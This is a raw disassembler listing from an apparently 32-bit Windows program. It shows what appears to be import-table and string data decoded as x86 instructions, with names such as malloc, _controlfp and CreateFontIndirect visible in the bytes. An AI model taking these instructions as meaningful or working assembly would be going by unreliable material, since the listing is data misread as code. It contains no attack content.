  412556:	add    DWORD PTR [eax],eax
  412558:	jmp    0x129:0xf2000129
  41255f:	add    BYTE PTR [eax],al
  412561:	sub    al,BYTE PTR [ecx]
  412563:	add    BYTE PTR [edx],cl
  412565:	sub    al,BYTE PTR [ecx]
  412567:	add    BYTE PTR [edx+ebp*1],dl
  41256a:	add    DWORD PTR [eax],eax
  41256c:	and    ch,BYTE PTR [edx]
  41256e:	add    DWORD PTR [eax],eax
  412570:	sub    al,0x2a
  412572:	add    DWORD PTR [eax],eax
  412574:	xor    al,0x2a
  412576:	add    DWORD PTR [eax],eax
  412578:	inc    eax
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+0x2a],cl
  41257e:	add    DWORD PTR [eax],eax
  412580:	push   esp
  412581:	sub    al,BYTE PTR [ecx]
  412583:	add    BYTE PTR [esi+0x2a],bl
  412586:	add    DWORD PTR [eax],eax
  412588:	data16 sub al,BYTE PTR [ecx]
  41258b:	add    BYTE PTR [eax+0x2a],dh
  41258e:	add    DWORD PTR [eax],eax
  412590:	jp     0x4125bc
  412592:	add    DWORD PTR [eax],eax
  412594:	sub    BYTE PTR [edx],0x1
  412597:	add    BYTE PTR [esi-0x65fffed6],cl
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x53fffed6],ah
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	retf   0x12a
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    dl,dh
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    dh,bh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	add    BYTE PTR [eax],al
  4125c7:	add    BYTE PTR [edx],bl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [esi],ch
  4125cd:	sub    eax,DWORD PTR [ecx]
  4125cf:	add    BYTE PTR [esi],bh
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4125d7:	add    BYTE PTR [eax+0x2b],bl
  4125da:	add    DWORD PTR [eax],eax
  4125dc:	push   0x7e00012b
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    BYTE PTR [edx-0x59fffed5],dl
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4125f2:	add    DWORD PTR [eax],eax
  4125f4:	loopne 0x412621
  4125f6:	add    DWORD PTR [eax],eax
  4125f8:	in     al,dx
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    dh,bh
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    BYTE PTR [esi],dl
  412601:	sub    al,0x1
  412603:	add    BYTE PTR [eax],ch
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [eax],bh
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [edx+0x2c],al
  41260e:	add    DWORD PTR [eax],eax
  412610:	pop    eax
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [edx+0x2c],dh
  412616:	add    DWORD PTR [eax],eax
  412618:	jle    0x412646
  41261a:	add    DWORD PTR [eax],eax
  41261c:	mov    ch,BYTE PTR [ecx+eax*1]
  41261f:	add    BYTE PTR [esi-0x47fffed4],bl
  412625:	sub    al,0x1
  412627:	add    ah,al
  412629:	sub    al,0x1
  41262b:	add    dl,dl
  41262d:	sub    al,0x1
  41262f:	add    ah,ah
  412631:	sub    al,0x1
  412633:	add    al,dh
  412635:	sub    al,0x1
  412637:	add    BYTE PTR [esi],al
  412639:	sub    eax,0x2d140001
  41263e:	add    DWORD PTR [eax],eax
  412640:	and    ch,BYTE PTR ds:0x2d300001
  412646:	add    DWORD PTR [eax],eax
  412648:	dec    edx
  412649:	sub    eax,0x2d5e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	push   0x2d
  412652:	add    DWORD PTR [eax],eax
  412654:	jp     0x412683
  412656:	add    DWORD PTR [eax],eax
  412658:	xchg   esi,eax
  412659:	sub    eax,0x2da60001
  41265e:	add    DWORD PTR [eax],eax
  412660:	mov    dh,0x2d
  412662:	add    DWORD PTR [eax],eax
  412664:	(bad)  
  412665:	sub    eax,0x2dd20001
  41266a:	add    DWORD PTR [eax],eax
  41266c:	loop   0x41269b
  41266e:	add    DWORD PTR [eax],eax
  412670:	hlt    
  412671:	sub    eax,0x2dfe0001
  412676:	add    DWORD PTR [eax],eax
  412678:	push   cs
  412679:	add    DWORD PTR cs:[eax],eax
  41267c:	push   ds
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	sub    BYTE PTR [esi],ch
  412682:	add    DWORD PTR [eax],eax
  412684:	add    BYTE PTR [eax],al
  412686:	add    BYTE PTR [eax],al
  412688:	dec    edx
  412689:	add    DWORD PTR cs:[eax],eax
  41268c:	add    BYTE PTR [eax],al
  41268e:	add    BYTE PTR [eax],al
  412690:	push   0x8000012e
  412695:	add    DWORD PTR cs:[eax],eax
  412698:	mov    WORD PTR [esi],gs
  41269a:	add    DWORD PTR [eax],eax
  41269c:	call   0x12e:0xb200012e
  4126a3:	add    dh,al
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	fsubr  QWORD PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0xf84127df
  4126b1:	add    DWORD PTR cs:[eax],eax
  4126b4:	adc    BYTE PTR [edi],ch
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	push   ds
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	xor    BYTE PTR [edi],ch
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	inc    eax
  4126c1:	das    
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	push   esi
  4126c5:	das    
  4126c6:	add    DWORD PTR [eax],eax
  4126c8:	data16 das 
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	jbe    0x4126fd
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	mov    ch,BYTE PTR [edi]
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	xchg   esi,eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	mov    dl,0x2f
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	enter  0x12f,0x0
  4126e4:	loopne 0x412715
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	hlt    
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	add    dh,BYTE PTR [eax]
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	sbb    BYTE PTR [eax],dh
  4126f2:	add    DWORD PTR [eax],eax
  4126f4:	xor    BYTE PTR cs:[ecx],al
  4126f7:	add    BYTE PTR [edx],bh
  4126f9:	xor    BYTE PTR [ecx],al
  4126fb:	add    BYTE PTR [eax+0x30],cl
  4126fe:	add    DWORD PTR [eax],eax
  412700:	push   edx
  412701:	xor    BYTE PTR [ecx],al
  412703:	add    BYTE PTR [esi+0x30],ah
  412706:	add    DWORD PTR [eax],eax
  412708:	jbe    0x41273a
  41270a:	add    DWORD PTR [eax],eax
  41270c:	mov    dh,BYTE PTR [eax]
  41270e:	add    DWORD PTR [eax],eax
  412710:	pushf  
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax-0x3bfffed0],dh
  412719:	xor    BYTE PTR [ecx],al
  41271b:	add    ah,dl
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    dl,ch
  412721:	xor    BYTE PTR [ecx],al
  412723:	add    BYTE PTR [edx],al
  412725:	xor    DWORD PTR [ecx],eax
  412727:	add    BYTE PTR [edx],bl
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [esi],ah
  41272d:	xor    DWORD PTR [ecx],eax
  41272f:	add    BYTE PTR [eax],bh
  412731:	xor    DWORD PTR [ecx],eax
  412733:	add    BYTE PTR [edx+0x31],cl
  412736:	add    DWORD PTR [eax],eax
  412738:	push   esi
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [eax+0x31],ch
  41273e:	add    DWORD PTR [eax],eax
  412740:	jbe    0x412773
  412742:	add    DWORD PTR [eax],eax
  412744:	xor    BYTE PTR [ecx],0x1
  412747:	add    BYTE PTR [esi-0x59fffecf],dl
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    BYTE PTR [eax-0x2dfffecf],bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    dl,ch
  412759:	xor    DWORD PTR [ecx],eax
  41275b:	add    BYTE PTR [eax],al
  41275d:	add    BYTE PTR [eax],al
  41275f:	add    BYTE PTR [esi],al
  412761:	xor    al,BYTE PTR [ecx]
  412763:	add    BYTE PTR [edx+esi*1],bl
  412766:	add    DWORD PTR [eax],eax
  412768:	xor    dh,BYTE PTR [edx]
  41276a:	add    DWORD PTR [eax],eax
  41276c:	inc    edx
  41276d:	xor    al,BYTE PTR [ecx]
  41276f:	add    BYTE PTR [edx+0x32],dl
  412772:	add    DWORD PTR [eax],eax
  412774:	pusha  
  412775:	xor    al,BYTE PTR [ecx]
  412777:	add    BYTE PTR [eax+0x32],dh
  41277a:	add    DWORD PTR [eax],eax
  41277c:	test   BYTE PTR [edx],dh
  41277e:	add    DWORD PTR [eax],eax
  412780:	xchg   esp,eax
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    BYTE PTR [eax-0x41fffece],ch
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,cl
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    al,ah
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    al,dh
  412795:	xor    al,BYTE PTR [ecx]
  412797:	add    BYTE PTR [edx],al
  412799:	xor    eax,DWORD PTR [ecx]
  41279b:	add    BYTE PTR [edx],bl
  41279d:	xor    eax,DWORD PTR [ecx]
  41279f:	add    BYTE PTR [esi],ah
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1],dh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	inc    esp
  4127a9:	xor    eax,DWORD PTR [ecx]
  4127ab:	add    BYTE PTR [edx+0x33],dl
  4127ae:	add    DWORD PTR [eax],eax
  4127b0:	push   0x7a000133
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi-0x6bfffecd],al
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    BYTE PTR [esi-0x4bfffecd],ah
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    dh,al
  4127c9:	xor    eax,DWORD PTR [ecx]
  4127cb:	add    al,bl
  4127cd:	xor    eax,DWORD PTR [ecx]
  4127cf:	add    dl,ch
  4127d1:	xor    eax,DWORD PTR [ecx]
  4127d3:	add    dl,bh
  4127d5:	xor    eax,DWORD PTR [ecx]
  4127d7:	add    BYTE PTR [esi],al
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [esp+esi*1],bl
  4127de:	add    DWORD PTR [eax],eax
  4127e0:	cmp    BYTE PTR [ecx+eax*1],dh
  4127e3:	add    BYTE PTR [edx+0x34],dl
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	data16 xor al,0x1
  4127eb:	add    BYTE PTR [esp+esi*1+0x1],dh
  4127ef:	add    BYTE PTR [eax-0x6dfffecc],al
  4127f5:	xor    al,0x1
  4127f7:	add    BYTE PTR [edx-0x51fffecc],ah
  4127fd:	xor    al,0x1
  4127ff:	add    BYTE PTR [edx-0x37fffecc],bh
  412805:	xor    al,0x1
  412807:	add    al,ah
  412809:	xor    al,0x1
  41280b:	add    al,dh
  41280d:	xor    al,0x1
  41280f:	add    BYTE PTR [eax],cl
  412811:	xor    eax,0x351a0001
  412816:	add    DWORD PTR [eax],eax
  412818:	sub    dh,BYTE PTR ds:0x35380001
  41281e:	add    DWORD PTR [eax],eax
  412820:	dec    edx
  412821:	xor    eax,0x35580001
  412826:	add    DWORD PTR [eax],eax
  412828:	fs xor eax,0x35720001
  41282e:	add    DWORD PTR [eax],eax
  412830:	jl     0x412867
  412832:	add    DWORD PTR [eax],eax
  412834:	xchg   esp,eax
  412835:	xor    eax,0x35a40001
  41283a:	add    DWORD PTR [eax],eax
  41283c:	mov    ah,0x35
  41283e:	add    DWORD PTR [eax],eax
  412840:	ret    0x135
  412843:	add    al,dl
  412845:	xor    eax,0x35e00001
  41284a:	add    DWORD PTR [eax],eax
  41284c:	div    BYTE PTR ds:0x36080001
  412852:	add    DWORD PTR [eax],eax
  412854:	push   ss
  412855:	add    DWORD PTR ss:[eax],eax
  412858:	sub    al,0x36
  41285a:	add    DWORD PTR [eax],eax
  41285c:	cmp    dh,BYTE PTR [esi]
  41285e:	add    DWORD PTR [eax],eax
  412860:	push   edx
  412861:	add    DWORD PTR ss:[eax],eax
  412864:	pop    esi
  412865:	add    DWORD PTR ss:[eax],eax
  412868:	push   0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	jbe    0x4128a4
  41286e:	add    DWORD PTR [eax],eax
  412870:	test   BYTE PTR [esi],dh
  412872:	add    DWORD PTR [eax],eax
  412874:	xchg   esi,eax
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	mov    ds:0xb4000136,al
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	shl    BYTE PTR [esi],0x1
  412883:	add    dh,cl
  412885:	add    DWORD PTR ss:[eax],eax
  412888:	fdiv   QWORD PTR [esi]
  41288a:	add    DWORD PTR [eax],eax
  41288c:	call   0xf64129c7
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	add    al,0x37
  412896:	add    DWORD PTR [eax],eax
  412898:	adc    al,0x37
  41289a:	add    DWORD PTR [eax],eax
  41289c:	es aaa 
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	cmp    al,0x37
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	inc    esi
  4128a5:	aaa    
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	push   esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	fs aaa 
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	jbe    0x4128e9
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	test   BYTE PTR [edi],dh
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	cwde   
  4128b9:	aaa    
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    dl,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	les    esi,FWORD PTR [edi]
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	aam    0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	call   0xfa412a04
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	or     bh,BYTE PTR [eax]
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	push   ss
  4128d5:	cmp    BYTE PTR [ecx],al
  4128d7:	add    BYTE PTR [eax+edi*1],dh
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	inc    esi
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1+0x1],bl
  4128e3:	add    BYTE PTR [eax+0x38],bh
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	nop
  4128e9:	cmp    BYTE PTR [ecx],al
  4128eb:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	mov    edx,0xc8000138
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    ah,ah
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dl,dh
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    BYTE PTR [esi],al
  412905:	cmp    DWORD PTR [ecx],eax
  412907:	add    BYTE PTR [eax],bl
  412909:	cmp    DWORD PTR [ecx],eax
  41290b:	add    BYTE PTR [edx],ch
  41290d:	cmp    DWORD PTR [ecx],eax
  41290f:	add    BYTE PTR [edx],bh
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [eax+0x39],dl
  412916:	add    DWORD PTR [eax],eax
  412918:	cmp    WORD PTR [ecx],ax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    al,ch
  412921:	add    esi,DWORD PTR [ebx+0x74]
  412924:	jb     0x412989
  412926:	jo     0x4129a1
  412928:	add    BYTE PTR [eax],al
  41292a:	or     eax,0x676e7504
  41292f:	gs je  0x412995
  412932:	add    BYTE PTR [eax],al
  412934:	pop    edi
  412935:	add    esp,DWORD PTR [ebx+0x6c]
  412938:	gs popa 
  41293a:	jb     0x4129a1
  41293c:	jb     0x4129b0
  41293e:	add    BYTE PTR [eax],al
  412940:	sub    BYTE PTR [edi+esi*2],al
  412943:	arpl   WORD PTR [ebx+0x6e],si
  412946:	arpl   WORD PTR [ebp+0x70],bp
  412949:	add    ch,dh
  41294b:	add    BYTE PTR [edi+0x63],bl
  41294e:	outs   dx,DWORD PTR ds:[esi]
  41294f:	outs   dx,BYTE PTR ds:[esi]
  412950:	je     0x4129c4
  412952:	outs   dx,DWORD PTR ds:[esi]
  412953:	ins    BYTE PTR es:[edi],dx
  412954:	data16 jo 0x412957
  412957:	add    BYTE PTR [ebp+0x6c616d03],dh
  41295d:	ins    BYTE PTR es:[edi],dx
  41295e:	outs   dx,DWORD PTR ds:[esi]
  41295f:	arpl   WORD PTR [eax],ax
  412961:	add    BYTE PTR [ebx+0x735f5f00],dh
  412967:	gs je  0x4129c9
  41296a:	popa   
  41296b:	jo     0x4129dd
  41296d:	pop    edi
  41296e:	je     0x4129e9
  412970:	jo     0x4129d7
  412972:	add    BYTE PTR [eax],al
  412974:	add    eax,DWORD PTR [ebx+esi*2]
  412977:	jns    0x4129ec
  412979:	je     0x4129e0
  41297b:	ins    DWORD PTR es:[edi],dx
  41297c:	add    BYTE PTR [eax],al
  41297e:	mov    al,ds:0x705f5f00
  412983:	pop    edi
  412984:	pop    edi
  412985:	ins    WORD PTR es:[edi],dx
  412987:	outs   dx,DWORD PTR ds:[esi]
  412988:	fs add BYTE PTR gs:[eax],al
  41298c:	pop    ebp
  41298d:	add    esp,DWORD PTR [ebx+0x61]
  412990:	ins    BYTE PTR es:[edi],dx
  412991:	ins    BYTE PTR es:[edi],dx
  412992:	outs   dx,DWORD PTR ds:[esi]
  412993:	arpl   WORD PTR [eax],ax
  412995:	add    BYTE PTR [ebx+0x705f5f00],bl
  41299b:	pop    edi
  41299c:	pop    edi
  41299d:	arpl   WORD PTR [edi+0x6d],bp
  4129a0:	ins    DWORD PTR es:[edi],dx
  4129a1:	outs   dx,DWORD PTR ds:[esi]
  4129a2:	fs add BYTE PTR gs:[eax],al
  4129a6:	std    
  4129a7:	add    esi,DWORD PTR [ebx+0x74]
  4129aa:	jb     0x412a20
  4129ac:	outs   dx,DWORD PTR ds:[esi]
  4129ad:	jne    0x412a1b
  4129af:	add    BYTE PTR [esi],dl
  4129b1:	add    al,0x76
  4129b3:	jae    0x412a25
  4129b5:	jb     0x412a20
  4129b7:	outs   dx,BYTE PTR ds:[esi]
  4129b8:	je     0x412a20
  4129ba:	add    BYTE PTR [eax],al
  4129bc:	sub    al,0x4
  4129be:	ja     0x412a23
  4129c0:	jae    0x412a32
  4129c2:	bound  esi,QWORD PTR [edx+0x6b]
  4129c5:	add    bl,bl
  4129c7:	add    BYTE PTR [edi+0x61],bl
  4129ca:	ins    DWORD PTR es:[edi],dx
  4129cb:	jae    0x412a34
  4129cd:	pop    edi
  4129ce:	gs js  0x412a3a
  4129d1:	je     0x4129d3
  4129d3:	add    BYTE PTR [esi+0x6e695f01],al
  4129d9:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x94006d72
  4129e1:	add    ebp,DWORD PTR [ecx+0x73]
  4129e4:	popa   
  4129e5:	ins    BYTE PTR es:[edi],dx
  4129e6:	outs   dx,BYTE PTR ds:[esi]
  4129e7:	jne    0x412a56
  4129e9:	add    BYTE PTR [ebp+0x3],ch
  4129ec:	data16 addr16 gs je 0x412a54
  4129f1:	add    BYTE PTR [esi+0x73695f01],bl
  4129f7:	ins    DWORD PTR es:[edi],dx
  4129f8:	bound  esp,QWORD PTR [edx+0x6c]
  4129fb:	gs popa 
  4129fd:	add    BYTE PTR fs:[eax],al
  412a00:	pop    ebx
  412a01:	add    esp,DWORD PTR [edx+0x73]
  412a04:	gs popa 
  412a06:	jb     0x412a6b
  412a08:	push   0x7303e500
  412a0d:	je     0x412a81
  412a0f:	arpl   WORD PTR [eax+0x72],bp
  412a12:	add    BYTE PTR [eax],al
  412a14:	push   edx
  412a15:	add    BYTE PTR [edi+0x58],bl
  412a18:	arpl   WORD PTR [eax+0x74],si
  412a1b:	inc    esi
  412a1c:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3e70072
  412a24:	jae    0x412a9a
  412a26:	jb     0x412a8b
  412a28:	outs   dx,DWORD PTR ds:[esi]
  412a29:	ins    BYTE PTR es:[edi],dx
  412a2a:	ins    BYTE PTR es:[edi],dx
  412a2b:	add    BYTE PTR [esi],al
  412a2d:	add    al,0x74
  412a2f:	imul   ebp,DWORD PTR [ebp+0x65],0x3b10000
  412a36:	ins    BYTE PTR es:[edi],dx
  412a37:	outs   dx,DWORD PTR ds:[esi]
  412a38:	arpl   WORD PTR [ecx+0x6c],sp
  412a3b:	je     0x412aa6
  412a3d:	ins    DWORD PTR es:[edi],dx
  412a3e:	add    BYTE PTR gs:[eax],bh
  412a41:	add    al,0x77
  412a43:	arpl   WORD PTR [ebx+0x74],si
  412a46:	outs   dx,DWORD PTR ds:[esi]
  412a47:	jne    0x412ab5
  412a49:	add    BYTE PTR [ecx],ah
  412a4b:	add    al,0x77
  412a4d:	arpl   WORD PTR [ebx+0x63],si
  412a50:	jo     0x412acb
  412a52:	add    BYTE PTR [eax],al
  412a54:	enter  0x7003,0x75
  412a58:	je     0x412abd
  412a5a:	push   0x78007261
  412a5f:	add    esp,DWORD PTR [esi+0x70]
  412a62:	jne    0x412ad8
  412a64:	arpl   WORD PTR [eax],ax
  412a66:	sbb    al,0x4
  412a68:	ja     0x412acd
  412a6a:	jae    0x412acf
  412a6c:	popa   
  412a6d:	je     0x412a6f
  412a6f:	add    dl,ch
  412a71:	add    esi,DWORD PTR [ebx+0x74]
  412a74:	jb     0x412ad9
  412a76:	jae    0x412ae8
  412a78:	outs   dx,BYTE PTR ds:[esi]
  412a79:	add    BYTE PTR [ebx+0x65736603],al
  412a7f:	imul   eax,DWORD PTR gs:[eax],0xffffffb7
  412a83:	add    ebp,DWORD PTR [ebp+0x62]
  412a86:	jae    0x412afc
  412a88:	outs   dx,DWORD PTR ds:[esi]
  412a89:	ja     0x412aee
  412a8b:	jae    0x412a8d
  412a8d:	add    BYTE PTR [ebx],cl
  412a8f:	add    al,0x74
  412a91:	outs   dx,DWORD PTR ds:[esi]
  412a92:	ja     0x412b00
  412a94:	outs   dx,DWORD PTR ds:[esi]
  412a95:	ja     0x412afc
  412a97:	jb     0x412a99
  412a99:	add    ah,cl
  412a9b:	add    esi,DWORD PTR [ecx+0x73]
  412a9e:	outs   dx,DWORD PTR ds:[esi]
  412a9f:	jb     0x412b15
  412aa1:	add    BYTE PTR [ecx],al
  412aa3:	add    al,0x73
  412aa5:	ja     0x412b1a
  412aa7:	arpl   WORD PTR [ecx+0x6e],sp
  412aaa:	data16 add BYTE PTR [ebx],ah
  412aad:	add    DWORD PTR [edi+0x65],ebx
  412ab0:	js     0x412b1b
  412ab2:	je     0x412ab4
  412ab4:	ss add al,0x77
  412ab7:	arpl   WORD PTR [ebx+0x74],si
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	ins    DWORD PTR es:[edi],dx
  412abc:	bound  esi,QWORD PTR [ebx+0x0]
  412abf:	add    al,ch
  412ac1:	add    BYTE PTR [edi+0x63],bl
  412ac4:	gs js  0x412b30
  412ac7:	je     0x412ac9
  412ac9:	add    BYTE PTR [ecx],ch
  412acb:	add    al,0x77
  412acd:	arpl   WORD PTR [ebx+0x6e],si
  412ad0:	arpl   WORD PTR [eax+0x79],si
  412ad3:	add    BYTE PTR [ebx+0x70736903],bl
  412ad9:	jb     0x412b44
  412adb:	outs   dx,BYTE PTR ds:[esi]
  412adc:	je     0x412ade
  412ade:	mov    ch,0x0
  412ae0:	pop    edi
  412ae1:	pop    edi
  412ae2:	jae    0x412b49
  412ae4:	je     0x412b5b
  412ae6:	jae    0x412b4d
  412ae8:	jb     0x412b57
  412aea:	popa   
  412aeb:	je     0x412b55
  412aed:	gs jb  0x412b62
  412af0:	add    BYTE PTR [eax],al
  412af2:	sbb    BYTE PTR [esi+esi*2],al
  412af5:	jae    0x412b6e
  412af7:	jo     0x412b6b
  412af9:	imul   ebp,DWORD PTR [esi+0x74],0x720066
  412b00:	pop    edi
  412b01:	pop    edi
  412b02:	addr16 gs je 0x412b73
  412b06:	popa   
  412b07:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b0e:	dec    ebp
  412b0f:	push   ebx
  412b10:	push   esi
  412b11:	inc    ebx
  412b12:	push   edx
  412b13:	push   esp
  412b14:	cs fs ins BYTE PTR es:[edi],dx
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	add    BYTE PTR [eax],al
  412b1a:	fadd   QWORD PTR [ecx]
  412b1c:	push   ebx
  412b1d:	gs je  0x412b64
  412b20:	dec    ecx
  412b21:	inc    edx
  412b22:	inc    ebx
  412b23:	outs   dx,DWORD PTR ds:[esi]
  412b24:	ins    BYTE PTR es:[edi],dx
  412b25:	outs   dx,DWORD PTR ds:[esi]
  412b26:	jb     0x412b7c
  412b28:	popa   
  412b29:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b2d:	add    bh,dl
  412b2f:	add    DWORD PTR [ebx+0x65],edx
  412b32:	je     0x412b76
  412b34:	jb     0x412bab
  412b36:	jae    0x412ba0
  412b38:	dec    edi
  412b39:	jb     0x412ba2
  412b3b:	inc    ebp
  412b3c:	js     0x412b3e
  412b3e:	add    DWORD PTR [eax],0x626d6f43
  412b44:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  412b4b:	add    BYTE PTR [ecx+eax*1],ah
  412b4e:	inc    edi
  412b4f:	gs je  0x412b94
  412b52:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  412b56:	gs add bh,cl
  412b59:	add    DWORD PTR [ebx+0x65],edx
  412b5c:	ins    BYTE PTR es:[edi],dx
  412b5d:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  412b62:	ins    BYTE PTR es:[edi],dx
  412b63:	gs je  0x412bda
  412b66:	add    BYTE PTR gs:[ecx+0x65724300],cl
  412b6d:	popa   
  412b6e:	je     0x412bd5
  412b70:	inc    edx
  412b71:	jb     0x412be8
  412b73:	jae    0x412bdd
  412b75:	dec    ecx
  412b76:	outs   dx,BYTE PTR ds:[esi]
  412b77:	imul   esi,DWORD PTR fs:[edx+0x65],0xaa007463
  412b7f:	add    BYTE PTR [ebx+0x72],al
  412b82:	gs popa 
  412b84:	je     0x412beb
  412b86:	push   eax
  412b87:	outs   dx,DWORD PTR ds:[esi]
  412b88:	ins    BYTE PTR es:[edi],dx
  412b89:	jns    0x412bf2
  412b8b:	outs   dx,DWORD PTR ds:[esi]
  412b8c:	outs   dx,BYTE PTR ds:[esi]
  412b8d:	push   edx
  412b8e:	outs   dx,BYTE PTR ds:[si]
  412b90:	add    BYTE PTR [eax],al
  412b92:	mov    al,ds:0x65724300
  412b97:	popa   
  412b98:	je     0x412bff
  412b9a:	dec    eax
  412b9b:	popa   
  412b9c:	je     0x412c01
  412b9e:	push   0x73757242
  412ba3:	push   0x17a0000
  412ba8:	inc    edi
  412ba9:	gs je  0x412bff
  412bac:	jns    0x412c21
  412bae:	je     0x412c15
  412bb0:	ins    DWORD PTR es:[edi],dx
  412bb1:	push   eax
  412bb2:	popa   
  412bb3:	ins    BYTE PTR es:[edi],dx
  412bb4:	gs je  0x412c2b
  412bb7:	gs push ebp
  412bb9:	jae    0x412c20
  412bbb:	add    BYTE PTR [esi+0x65724300],bl
  412bc1:	popa   
  412bc2:	je     0x412c29
  412bc4:	inc    esi
  412bc5:	outs   dx,DWORD PTR ds:[esi]
  412bc6:	outs   dx,BYTE PTR ds:[esi]
  412bc7:	je     0x412c20
  412bc9:	add    BYTE PTR [ebp+0x65724300],bl
  412bcf:	popa   
  412bd0:	je     0x412c37
  412bd2:	inc    esi
  412bd3:	outs   dx,DWORD PTR ds:[esi]
  412bd4:	outs   dx,BYTE PTR ds:[esi]
  412bd5:	je     0x412c20
  412bd7:	outs   dx,BYTE PTR ds:[esi]
  412bd8:	imul   esi,DWORD PTR fs:[edx+0x65],0x577463
  412be0:	mov    ah,0x1
  412be2:	push   eax
  412be3:	outs   dx,DWORD PTR ds:[esi]
  412be4:	ins    BYTE PTR es:[edi],dx
  412be5:	jns    0x412c53
  412be7:	imul   ebp,DWORD PTR [esi+0x65],0x18a0000
  412bee:	inc    edi
  412bef:	gs je  0x412c46
  412bf2:	gs js  0x412c69
  412bf5:	dec    ebp
  412bf6:	gs je  0x412c6b
  412bf9:	imul   esp,DWORD PTR [ebx+0x73],0x20d0041
  412c00:	push   esp
  412c01:	jb     0x412c64
